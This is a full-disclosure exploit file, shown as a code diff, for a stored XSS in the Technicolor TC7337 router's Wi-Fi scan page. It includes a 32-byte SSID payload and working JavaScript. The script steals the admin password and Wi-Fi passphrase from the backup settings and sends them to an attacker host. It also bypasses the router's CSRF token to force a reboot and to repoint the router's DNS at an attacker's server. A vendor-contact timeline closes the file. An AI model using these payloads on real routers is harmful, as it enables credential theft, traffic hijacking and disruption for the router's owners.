@@ -1,0 +1,90 @@
+// Device : Technicolor TC7337
+// Vulnerable URL : https://your.rou.ter.ip/wlscanresults.html
+// XSS through SSID : '><script src=//url.co></script>   ( Exactly 32 bytes u_u )
+//                             ^
+//  5char domains are running  |    'src' does not requires quotes , and passing the URL with ony '//'
+//  out, grab yours !          +---> it will cause the browser to make the request with the current protocol,
+//                                   which is HTTP , duh
+// Below is the content of url.co/index.html
+// index.html ( which is just a JavaScript actually, but we have to use the index to fit the 32 chars ) :
+
+function get_passwords(attackers_server) {
+  // attackers_server = server to send the credentials
+  // ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+  // XSS to get Admin's login/passwd + Wifi passphrase
+  // from backup settings
+
+  xmlhttp=new XMLHttpRequest();
+  xmlhttp.open("GET", "/backupsettings.cmd", false); // GET the Backup XML
+  xmlhttp.send();
+  var k = xmlhttp.responseText.indexOf("Admin") ; // Search for Admin's Login and Password
+  var y = xmlhttp.responseText.indexOf("KeyPassphrase") ; // Search for Wifi PassPhrase
+  // Add a img requesting the attacker website with the leaked passwords in the GET parameters
+  document.write('<img src="'+attackers_server+'?net='+ encodeURIComponent(xmlhttp.responseText.slice(k,k+100)+xmlhttp.responseText.slice(y,y+80))+'">');
+}
+
+function reboot_router() {
+  // XSS + CSRF reboot router
+  // ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+  // Why? Because It's fun to watch a XSS doing 'physical' stuff
+
+  xmlhttp=new XMLHttpRequest();
+  xmlhttp.open("GET", "/resetrouter.html", false); // GET the page of the reset interface
+  xmlhttp.send();
+  var w = xmlhttp.responseText.indexOf("Key") ; // Search for the SessionKey, some sort of CSRF Token
+  var sessionKey = xmlhttp.responseText.slice(w,w+20).match(/'([^']+)'/)[1] ; // Regex because the key is inside quotes
+
+  xmlhttp=new XMLHttpRequest();
+  xmlhttp.open("GET", "/rebootinfo.cgi?sessionKey="+sessionKey, false);
+// Request the reboot page with the CSRF token
+  xmlhttp.send();
+}
+
+function dns_poisoning(attackers_dns) {
+  // attackers_dns = malicious DNS Server
+  // ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ holy shit my code is ugly as fuck , sorry world
+  // Alter the DNS Config of the Router
+  // changing the Primary and Secondary DNS to the attacker's one
+
+  xmlhttp=new XMLHttpRequest();  
+  xmlhttp.open("GET", "/rede-dnsv4.html", false); // GET the DNS Config page
+  xmlhttp.send();
+  var w = xmlhttp.responseText.indexOf("Key") ; // Search for the SessionKey, some sort of CSRF Token
+  var sessionKey = xmlhttp.responseText.slice(w,w+20).match(/'([^']+)'/)[1]; // Regex because the key is inside quotes
+  var i_wanip = xmlhttp.responseText.indexOf("wanip");
+  var wanip = xmlhttp.responseText.slice(i_wanip,i_wanip+30).match(/'([^']+)'/)[1];
+  var i_wansubnet = xmlhttp.responseText.indexOf("wansubnet");
+  var wansubnet = xmlhttp.responseText.slice(i_wansubnet,i_wansubnet+30).match(/'([^']+)'/)[1];
+  var i_wangatewayip = xmlhttp.responseText.indexOf("wangatewayip");
+  var wangatewayip = xmlhttp.responseText.slice(i_wangatewayip,i_wangatewayip+30).match(/'([^']+)'/)[1];
+
+  xmlhttp=new XMLHttpRequest();
+  xmlhttp.open("GET", "/rede-dnsv4.cgi?enblDhcpClnt=0&wanIpAddress="+wanip+"&wanIfName=wanbridge&wanSubnetMask="+wansubnet+"&wanIntfGateway="+wangatewayip+"&dnsPrimary="+attackers_dns+"&dnsSecondary="+attackers_dns+"&sessionKey="+sessionKey, false);
+  xmlhttp.send(); // Send the request to SAVE the Primary and Secondary DNS with the CSRF Token
+
+  //After saving we need to apply the settings. yeah, fuck logic --'
+
+  //Getting a brand NEW SessionKey
+  xmlhttp=new XMLHttpRequest();  
+  xmlhttp.open("GET", "/rede-dnsv4.html", false); // GET the DNS Config page
+  xmlhttp.send();
+  var w = xmlhttp.responseText.indexOf("Key") ; // Search for the SessionKey, some sort of CSRF Token
+  var sessionKey = xmlhttp.responseText.slice(w,w+20).match(/'([^']+)'/)[1] ; // Regex because the key is inside quotes
+
+  xmlhttp=new XMLHttpRequest();  
+  xmlhttp.open("GET", "/wandnscfg.cmd?sessionKey="+sessionKey, false);
+// GET the apply DNS page
+  xmlhttp.send();
+}
+
+//Choose your path !
+//get_passwords("https://evil.domain/") ;
+//reboot_router();
+dns_poisoning("1.3.3.7")
+
+// TimeLine
+// ---------
+// 08/07/2017 - First email sent to the vendor (no answer)
+// 16/07/2017 - Second email sent to the vendor (no answer)
+// 18/07/2017 - Third email sent to the vendor (no answer)
+// 02/08/2017 - Full Disclosure
